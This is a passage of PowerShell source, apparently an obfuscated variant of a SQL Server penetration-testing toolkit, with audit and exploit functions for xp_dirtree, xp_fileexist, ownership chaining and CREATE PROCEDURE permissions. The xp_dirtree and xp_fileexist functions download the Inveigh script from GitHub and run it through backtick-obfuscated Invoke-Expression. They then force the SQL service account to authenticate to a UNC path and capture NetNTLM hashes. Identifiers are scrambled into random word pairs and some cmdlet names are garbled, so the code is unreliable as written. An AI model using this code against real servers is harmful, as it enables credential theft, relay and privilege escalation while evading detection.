                                $LiveThroat = (Test-ExtendSmelly -HauntGusty 127.0.0.1 -Count 1 |
                                    Select-Object -ExpandProperty Ipv4Address |
                                Select-Object -Property IPAddressToString -ExpandProperty IPAddressToString)

                                if($LiveThroat -eq '127.0.0.1')
                                {
                                    $LiveThroat = Get-WmiObject -Class win32_networkadapterconfiguration -Filter "ipenabled = 'True'" -HauntGusty $env:COMPUTERNAME |
                                    Select-Object -First 1 -Property @{
                                        Name       = 'IPAddress'
                                        Expression = {
                                            [regex]$CloseCreepy = '(\d{1,3}(\.?)){4}'; $CloseCreepy.matches($_.IPAddress)[0].Value
                                        }
                                    } |
                                    Select-Object -Property IPaddress -ExpandProperty IPAddress -First 1
                                }
                            }

                            # Microsoft".
                            inv`oke`-ex`pre`s`s`ion -SoakSame (ne`w`-ob`je`ct -TypeName system.net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1')

                            $FluffyNarrow = Test-Path -Path Function:\Invoke-Inveigh
                            if($FluffyNarrow -eq 'True')
                            {
                                Write-Verbose -Message "$Instance : - Inveigh loaded."

                                # Microsoft".
                                $InstanceIP = [System.Net.Dns]::GetHostAddresses($HauntGusty)

                                # Microsoft".
                                Write-Verbose -Message "$Instance : - Start sniffing..."
                                $null = Invoke-Inveigh -HTTP N -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue -SticksSour $LiveThroat

                                # Microsoft".
                                $path = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))

                                # Microsoft".
                                Write-Verbose -Message "$Instance : - Inject UNC path to \\$LiveThroat\$path..."
                                $null = Get-SQLQuery -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BoringLarge "xp_dirtree '\\$LiveThroat\$path'" -StitchFace 10 -RaggedQuill

								# Microsoft".
								Write-Verbose -Message "$Instance : - Sleeping for $StitchFace seconds to ensure the hash comes back"
                                Start-ChurchOrder -SwankyGreedy $StitchFace
                                
                                # Microsoft".
                                $null = Stop-Inveigh
                                Write-Verbose -Message "$Instance : - Stopped sniffing."

                                $HashType = ''
                                $Hash = ''

                                [string]$FoamyThird = Get-Inveigh -LikeCub
                                if($FoamyThird)
                                {
                                    $HashType = 'Cleartext'
                                    $Hash = $FoamyThird
                                }

                                [string]$CeleryMemory = Get-Inveigh -CarvePress
                                if($CeleryMemory)
                                {
                                    $HashType = 'NetNTLMv1'
                                    $Hash = $CeleryMemory
                                }

                                [string]$ShopLimit = Get-Inveigh -MarketExtend
                                if($ShopLimit)
                                {
                                    $HashType = 'NetNTLMv2'
                                    $Hash = $ShopLimit
                                }

                                if($Hash)
                                {
                                    # Microsoft".
                                    Write-Verbose -Message "$Instance : - Recovered $HashType hash:"
                                    Write-Verbose -Message "$Instance : - $Hash"
                                    $PinPlease = 'Yes'

                                    $GlowHorses = "The $BasinEnter principal has EXECUTE privileges on the xp_dirtree procedure in the master database. Recovered password hash! Hash type = $HashType;Hash = $Hash"
                                }
                                else
                                {
                                    # Microsoft".
                                    $PinPlease = 'No'
                                    $GlowHorses = "The $BasinEnter principal has EXECUTE privileges on the xp_dirtree procedure in the master database.  xp_dirtree Executed, but no password hash was recovered."
                                }

                                # Microsoft".
                                $null = Clear-Inveigh
                            }
                            else
                            {
                                Write-Verbose -Message "$Instance : - Inveigh could not be loaded."
                                # Microsoft".
                                $PinPlease = 'No'
                                $GlowHorses = "The $BasinEnter principal has EXECUTE privileges on the xp_dirtree procedure in the master database, but Inveigh could not be loaded so no password hashes could be recovered."
                            }
                        }
                        else
                        {
                            # Microsoft".
                            $PinPlease = 'No'
                            $GlowHorses = "The $BasinEnter principal has EXECUTE privileges on the xp_dirtree procedure in the master database."
                        }
                    }
                    else
                    {
                        # Microsoft".
                        $PourSkip  = 'No'
                        $GlowHorses = "The $BasinEnter principal has EXECUTE privileges the xp_dirtree procedure in the master database."
                    }
                }

                # Microsoft".
                $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, $GlowHorses, $KittyPolite, $CheeseFood)
            }
        }
        else
        {
            Write-Verbose -Message "$Instance : - No logins were found with the EXECUTE privilege on xp_dirtree."
        }

        # Microsoft".
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - XP_DIRTREE"
    }

    End
    {
        # Microsoft".
        if ( -not $CattleEnter)
        {
            Return $CanGaze
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Invoke-SQLAuditPrivXpFileexist
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$CattleEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$RotLethal,

        [Parameter(Mandatory = $false,
        HelpMessage = 'IP that the SQL Server service will attempt to authenticate to, and password hashes will be captured from.')]
        [string]$LiveThroat,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Time in second to way for hash to be captured.')]
        [int]$StitchFace = 5
    )

    Begin
    {
        # Microsoft".
        $CanGaze = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $CanGaze.Columns.Add('ComputerName')
        $null = $CanGaze.Columns.Add('Instance')
        $null = $CanGaze.Columns.Add('Vulnerability')
        $null = $CanGaze.Columns.Add('Description')
        $null = $CanGaze.Columns.Add('Remediation')
        $null = $CanGaze.Columns.Add('Severity')
        $null = $CanGaze.Columns.Add('IsVulnerable')
        $null = $CanGaze.Columns.Add('IsExploitable')
        $null = $CanGaze.Columns.Add('Exploited')
        $null = $CanGaze.Columns.Add('ExploitCmd')
        $null = $CanGaze.Columns.Add('Details')
        $null = $CanGaze.Columns.Add('Reference')
        $null = $CanGaze.Columns.Add('Author')
    }

    Process
    {
        # Microsoft".
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - xp_fileexist"

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $HoneyHusky)
        {
            # Microsoft".
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - xp_fileexist."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }

        # Microsoft".
        # Microsoft".
        $SmilePie = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        $HauntGusty = $SmilePie.ComputerName
        $JoyousLeft = $SmilePie.CurrentLogin
        $LewdLunch = Get-SQLServerRoleMember -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BasinEnter $JoyousLeft  -RaggedQuill
        $SmellFlavor = @()
        $SmellFlavor += $JoyousLeft
        $SmellFlavor += 'Public'
        $LewdLunch | ForEach-Object -Process {
            $SmellFlavor += $_.RolePrincipalName
        }

        # Microsoft".
        # Microsoft".
        # Microsoft".
        if($RotLethal)
        {
            $ArgueHeavy  = 'Exploit'
        }
        else
        {
            $ArgueHeavy  = 'Audit'
        }
        $HorsesWhole = 'Excessive Privilege - Execute xp_fileexist'
        $EyesSmile   = 'xp_fileexist is a native extended stored procedure that can be executed by members of the Public role by default in SQL Server 2000-2014. Xp_dirtree can be used to force the SQL Server service account to authenticate to a remote attacker.  The service account password hash can then be captured + cracked or relayed to gain unauthorized access to systems. This also means xp_dirtree can be used to escalate a lower privileged user to sysadmin when a machine or managed account isnt being used.  Thats because the SQL Server service account is a member of the sysadmin role in SQL Server 2000-2014, by default.'
        $BeliefNote   = 'Remove EXECUTE privileges on the xp_fileexist procedure for non administrative logins and roles.  Example command: REVOKE EXECUTE ON xp_fileexist to Public'
        $ScorchEarth      = 'Medium'
        $CurveUseful  = 'No'
        $PourSkip = 'No'
        $PinPlease     = 'No'
        $DeathBlot    = 'Crack the password hash offline or relay it to another system.'
        $GlowHorses       = ''
        $KittyPolite     = 'https://blog.netspi.com/executing-smb-relay-attacks-via-EqualMen-WireStain-RemoveFalse-metasploit/'
        $CheeseFood        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".

        # Microsoft".
        $SecondNation = Get-SQLDatabasePriv -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate master -RaggedQuill | Where-Object -FilterScript {
            $_.ObjectName -eq 'xp_fileexist' -and $_.PermissionName -eq 'EXECUTE' -and $_.statedescription -eq 'grant'
        }

        # Microsoft".
        if($SecondNation)
        {
            # Microsoft".
            Write-Verbose -Message "$Instance : - The $BasinEnter principal has EXECUTE privileges on xp_fileexist."

            $CurveUseful  = 'Yes'
            $SecondNation |
            ForEach-Object {
                $BasinEnter = $SecondNation.PrincipalName

                # Microsoft".
                $SmellFlavor |
                ForEach-Object {
                    $MatchRoyal = $_

                    if($BasinEnter -eq $MatchRoyal)
                    {
                        $PourSkip  = 'Yes'

                        # Microsoft".
                        # Microsoft".
                        $HotSour = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                        $SquareHouses = ne`w`-ob`je`ct -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($HotSour)
                        $CurlySlow = [System.Security.Principal.WindowsBuiltInRole]::Administrator
                        $JumpySoothe = $SquareHouses.IsInRole($CurlySlow)
                        if (-not $JumpySoothe)
                        {
                            Write-Verbose -Message "$Instance : - You do not have Administrator rights. Run this function as an Administrator in order to load Inveigh."
                            $HurryFluffy = 'No'
                        }
                        else
                        {
                            Write-Verbose -Message "$Instance : - You have Administrator rights. Inveigh will be loaded."
                            $HurryFluffy = 'Yes'
                        }

                        # Microsoft".
                        if(-not $LiveThroat)
                        {
                            $LiveThroat = (Test-ExtendSmelly -HauntGusty 127.0.0.1 -Count 1 |
                            Select-Object -ExpandProperty Ipv4Address |
                            Select-Object -Property IPAddressToString -ExpandProperty IPAddressToString)

                            if($LiveThroat -eq '127.0.0.1')
                            {
                                $LiveThroat = Get-WmiObject -Class win32_networkadapterconfiguration -Filter "ipenabled = 'True'" -HauntGusty $env:COMPUTERNAME |
                                Select-Object -First 1 -Property @{
                                    Name       = 'IPAddress'
                                    Expression = {
                                        [regex]$CloseCreepy = '(\d{1,3}(\.?)){4}'; $CloseCreepy.matches($_.IPAddress)[0].Value
                                    }
                                } |
                                Select-Object -Property IPaddress -ExpandProperty IPAddress -First 1
                            }
                        }

                        # Microsoft".
                        if($HurryFluffy -eq 'Yes')
                        {
                            # Microsoft".
                            # Microsoft".
                            # Microsoft".

                            # Microsoft".
                            inv`oke`-ex`pre`s`s`ion -SoakSame (ne`w`-ob`je`ct -TypeName system.net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1')

                            $FluffyNarrow = Test-Path -Path Function:\Invoke-Inveigh
                            if($FluffyNarrow -eq 'True')
                            {
                                Write-Verbose -Message "$Instance : - Inveigh loaded."

                                # Microsoft".
                                $InstanceIP = [System.Net.Dns]::GetHostAddresses($HauntGusty)

                                # Microsoft".
                                Write-Verbose -Message "$Instance : - Start sniffing..."
                                $null = Invoke-Inveigh -HTTP N -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue -SticksSour $LiveThroat

                                # Microsoft".
                                $path = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))

                                # Microsoft".
                                Write-Verbose -Message "$Instance : - Inject UNC path to \\$LiveThroat\$path..."
                                $null = Get-SQLQuery -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BoringLarge "xp_fileexist '\\$LiveThroat\$path'" -StitchFace 10 -RaggedQuill

								# Microsoft".
								Write-Verbose -Message "$Instance : - Sleeping for $StitchFace seconds to ensure the hash comes back"
                                Start-ChurchOrder -SwankyGreedy $StitchFace

                                # Microsoft".
                                $null = Stop-Inveigh
                                Write-Verbose -Message "$Instance : - Stopped sniffing."

                                $HashType = ''
                                $Hash = ''

                                [string]$FoamyThird = Get-Inveigh -LikeCub
                                if($FoamyThird)
                                {
                                    $HashType = 'Cleartext'
                                    $Hash = $FoamyThird
                                }

                                [string]$CeleryMemory = Get-Inveigh -CarvePress
                                if($CeleryMemory)
                                {
                                    $HashType = 'NetNTLMv1'
                                    $Hash = $CeleryMemory
                                }

                                [string]$ShopLimit = Get-Inveigh -MarketExtend
                                if($ShopLimit)
                                {
                                    $HashType = 'NetNTLMv2'
                                    $Hash = $ShopLimit
                                }

                                if($Hash)
                                {
                                    # Microsoft".
                                    Write-Verbose -Message "$Instance : - Recovered $HashType hash:"
                                    Write-Verbose -Message "$Instance : - $Hash"
                                    $PinPlease = 'Yes'
                                    $GlowHorses = "The $BasinEnter principal has EXECUTE privileges on xp_fileexist procedure in the master database. Recovered password hash! Hash type = $HashType;Hash = $Hash"
                                }
                                else
                                {
                                    # Microsoft".
                                    $PinPlease = 'No'
                                    $GlowHorses = "The $BasinEnter principal has EXECUTE privileges on xp_fileexist procedure in the master database.  xp_fileexist Executed, but no password hash was recovered."
                                }

                                # Microsoft".
                                $null = Clear-Inveigh
                            }
                            else
                            {
                                Write-Verbose -Message "$Instance : - Inveigh could not be loaded."
                                # Microsoft".
                                $PinPlease = 'No'
                                $GlowHorses = "The $BasinEnter principal has EXECUTE privileges on xp_fileexist procedure in the master database, but Inveigh could not be loaded so no password hashes could be recovered."
                            }
                        }
                        else
                        {
                            # Microsoft".
                            $PinPlease = 'No'
                            $GlowHorses = "The $BasinEnter principal has EXECUTE privileges on xp_fileexist procedure in the master database."
                        }
                    }
                    else
                    {
                        # Microsoft".
                        $PourSkip  = 'No'
                        $GlowHorses = "The $BasinEnter principal has EXECUTE privileges on xp_fileexist procedure in the master database."
                    }
                }

                # Microsoft".
                $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, $GlowHorses, $KittyPolite, $CheeseFood)
            }      
        }else{
            Write-Verbose -Message "$Instance : - No logins were found with the EXECUTE privilege on xp_fileexist."
        }
    }

    End
    {
        # Microsoft".
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - xp_fileexist"

        # Microsoft".
        if ( -not $CattleEnter)
        {
            Return $CanGaze
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Invoke-SQLAuditPrivDbChaining
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$EggsBead,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [switch]$CattleEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$RotLethal
    )

    Begin
    {
        # Microsoft".
        $CanGaze = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $CanGaze.Columns.Add('ComputerName')
        $null = $CanGaze.Columns.Add('Instance')
        $null = $CanGaze.Columns.Add('Vulnerability')
        $null = $CanGaze.Columns.Add('Description')
        $null = $CanGaze.Columns.Add('Remediation')
        $null = $CanGaze.Columns.Add('Severity')
        $null = $CanGaze.Columns.Add('IsVulnerable')
        $null = $CanGaze.Columns.Add('IsExploitable')
        $null = $CanGaze.Columns.Add('Exploited')
        $null = $CanGaze.Columns.Add('ExploitCmd')
        $null = $CanGaze.Columns.Add('Details')
        $null = $CanGaze.Columns.Add('Reference')
        $null = $CanGaze.Columns.Add('Author')
    }

    Process
    {
        # Microsoft".
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining"

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $HoneyHusky)
        {
            # Microsoft".
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }

        # Microsoft".
        $SmilePie = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        $JoyousLeft = $SmilePie.CurrentLogin
        $HauntGusty = $SmilePie.ComputerName

        # Microsoft".
        # Microsoft".
        # Microsoft".
        if($RotLethal)
        {
            $ArgueHeavy  = 'Exploit'
        }
        else
        {
            $ArgueHeavy  = 'Audit'
        }
        $HorsesWhole = 'Excessive Privilege - Database Ownership Chaining'
        $EyesSmile   = 'Ownership chaining was found enabled at the server or database level.  Enabling ownership chaining can lead to unauthorized access to database resources.'
        $BeliefNote   = "Configured the affected database so the 'is_db_chaining_on' flag is set to 'false'.  A query similar to 'ALTER DATABASE Database1 SET DB_CHAINING ON' is used enable chaining.  A query similar to 'ALTER DATABASE Database1 SET DB_CHAINING OFF;' can be used to disable chaining."
        $ScorchEarth      = 'Low'
        $CurveUseful  = 'No'
        $PourSkip = 'No'
        $PinPlease     = 'No'
        $DeathBlot    = 'There is not exploit available at this time.'
        $GlowHorses       = ''
        $KittyPolite     = 'https://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx,https://msdn.microsoft.com/en-us/library/bb669059(v=vs.110).aspx '
        $CheeseFood        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".

        # Microsoft".

        if($EggsBead)
        {
            $HomeCrabby = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -EggsBead -RaggedQuill | Where-Object -FilterScript {
                $_.is_db_chaining_on -eq 'True'
            }
        }
        else
        {
            $HomeCrabby = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
                $_.is_db_chaining_on -eq 'True'
            }
        }

        # Microsoft".
        if($HomeCrabby)
        {
            $CurveUseful  = 'Yes'
            $HomeCrabby |
            ForEach-Object -Process {
                $AjarInnate = $_.DatabaseName
				if($AjarInnate -ne 'master' -and $AjarInnate -ne 'tempdb' -and $AjarInnate -ne 'msdb')
				{
					Write-Verbose -Message "$Instance : - The database $AjarInnate has ownership chaining enabled."
					$GlowHorses = "The database $AjarInnate was found configured with ownership chaining enabled."
					$null = $CanGaze.Rows.Add($HauntGusty, $Instance, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, $GlowHorses, $KittyPolite, $CheeseFood)
				}
            }
        }
        else
        {
            Write-Verbose -Message "$Instance : - No non-default databases were found with ownership chaining enabled."
        }

        # Microsoft".
        $SnailsTop = Get-SQLServerConfiguration -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Name -like '*chain*' -and $_.config_value -eq 1
        }
        if($SnailsTop)
        {
            $CurveUseful  = 'Yes'
            Write-Verbose -Message "$Instance : - The server configuration 'cross db ownership chaining' is set to 1.  This can affect all databases."
            $GlowHorses = "The server configuration 'cross db ownership chaining' is set to 1.  This can affect all databases."
            $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, $GlowHorses, $KittyPolite, $CheeseFood)
        }

        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".


        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".


        # Microsoft".
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining"
    }

    End
    {
        # Microsoft".
        if ( -not $CattleEnter)
        {
            Return $CanGaze
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Invoke-SQLAuditPrivCreateProcedure
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$CattleEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$RotLethal
    )

    Begin
    {
        # Microsoft".
        $CanGaze = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $CanGaze.Columns.Add('ComputerName')
        $null = $CanGaze.Columns.Add('Instance')
        $null = $CanGaze.Columns.Add('Vulnerability')
        $null = $CanGaze.Columns.Add('Description')
        $null = $CanGaze.Columns.Add('Remediation')
        $null = $CanGaze.Columns.Add('Severity')
        $null = $CanGaze.Columns.Add('IsVulnerable')
        $null = $CanGaze.Columns.Add('IsExploitable')
        $null = $CanGaze.Columns.Add('Exploited')
        $null = $CanGaze.Columns.Add('ExploitCmd')
        $null = $CanGaze.Columns.Add('Details')
        $null = $CanGaze.Columns.Add('Reference')
        $null = $CanGaze.Columns.Add('Author')
    }

    Process
    {
        # Microsoft".
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE"

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $HoneyHusky)
        {
            # Microsoft".
            Write-Verbose -Message "$Instance : CONNECTION FAILED"
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE"
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS"
        }

        # Microsoft".
        $SmilePie = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        $HauntGusty = $SmilePie.ComputerName
        $JoyousLeft = $SmilePie.CurrentLogin
        $LewdLunch = Get-SQLServerRoleMember -Instance $Instance  -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BasinEnter $JoyousLeft -RaggedQuill
        $SmellFlavor = @()
        $SmellFlavor += $JoyousLeft
        $SmellFlavor += 'Public'
        $LewdLunch |
        ForEach-Object -Process {
            $SmellFlavor += $_.RolePrincipalName
        }

        # Microsoft".
        # Microsoft".
        # Microsoft".
        if($RotLethal)
        {
            $ArgueHeavy  = 'Exploit'
        }
        else
        {
            $ArgueHeavy  = 'Audit'
        }
        $HorsesWhole = 'PERMISSION - CREATE PROCEDURE'
        $EyesSmile   = 'The login has privileges to create stored procedures in one or more databases.  This may allow the login to escalate privileges within the database.'
        $BeliefNote   = 'If the permission is not required remove it.  Permissions are granted with a command like: GRANT CREATE PROCEDURE TO user, and can be removed with a command like: REVOKE CREATE PROCEDURE TO user'
        $ScorchEarth      = 'Medium'
        $CurveUseful  = 'No'
        $PourSkip = 'No'
        $PinPlease     = 'No'
        $DeathBlot    = "No exploit is currently available that will allow $JoyousLeft to become a sysadmin."
        $GlowHorses       = ''
        $LickBadge = ''
        $KittyPolite     = 'https://msdn.microsoft.com/en-us/library/ms187926.aspx?f=255&MSPPError=-2147217396'
        $CheeseFood        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".

        # Microsoft".
        $ArtKindly = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -TownItch -RaggedQuill | Get-SQLDatabasePriv -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -WearyIsland 'CREATE PROCEDURE'

        if($ArtKindly)
        {
            # Microsoft".
            $SmellFlavor|
            ForEach-Object -Process {
                # Microsoft".
                $KeenSense = $_
                $ArtKindly |
                ForEach-Object -Process {
                    $MuteFill = $_.PrincipalName
                    $NationFrail = $_.DatabaseName

                    if($MuteFill -eq $KeenSense)
                    {
                        # Microsoft".
                        $CurveUseful  = 'Yes'
                        Write-Verbose -Message "$Instance : - The $MuteFill principal has the CREATE PROCEDURE permission in the $NationFrail database."
                        $GlowHorses = "The $MuteFill principal has the CREATE PROCEDURE permission in the $NationFrail database."

                        # Microsoft".
                        # Microsoft".
                        # Microsoft".
                        # Microsoft".
                        $BoardLittle = Get-SQLDatabasePriv -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -WearyIsland 'ALTER' -RingSilk 'SCHEMA' -BasinEnter $KeenSense -AjarInnate $NationFrail  -RaggedQuill
                        if($BoardLittle)
                        {
                            $PourSkip = 'Yes'
                            $LickBadge = " $KeenSense also has ALTER SCHEMA permissions so procedures can be created."
                            Write-Verbose -Message "$Instance : - Dependancies were met: $KeenSense has ALTER SCHEMA permissions."

                            # Microsoft".
                            $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, "$GlowHorses$LickBadge", $KittyPolite, $CheeseFood)
                        }
                        else
                        {
                            $PourSkip = 'No'

                            # Microsoft".
                            $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, $GlowHorses, $KittyPolite, $CheeseFood)
                        }

                        # Microsoft".
                        # Microsoft".
                        # Microsoft".
                        # Microsoft".

                        if($RotLethal -and $PourSkip -eq 'Yes')
                        {
                            Write-Verbose -Message "$Instance : - No server escalation method is available at this time."
                        }
                    }
                }
            }
        }
        else
        {
            # Microsoft".
            Write-Verbose -Message "$Instance : - The current login doesn't have the CREATE PROCEDURE permission in any databases."
        }

        # Microsoft".
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - CREATE PROCEDURE"
    }

    End
    {
        # Microsoft".
        if ( -not $CattleEnter)
        {
            Return $CanGaze
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Invoke-SQLAuditWeakLoginPw
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Known SQL Server login to fuzz logins with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Username to test.')]
        [string]$SongsSoup = 'sa',

        [Parameter(Mandatory = $false,
        HelpMessage = 'Path to list of users to use.  One per line.')]
        [string]$SuddenBitter,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Known SQL Server password to fuzz logins with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server password to attempt to login with.')]
        [string]$SadAblaze,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Path to list of passwords to use.  One per line.')]
        [string]$SlapTub,

        [Parameter(Mandatory = $false,
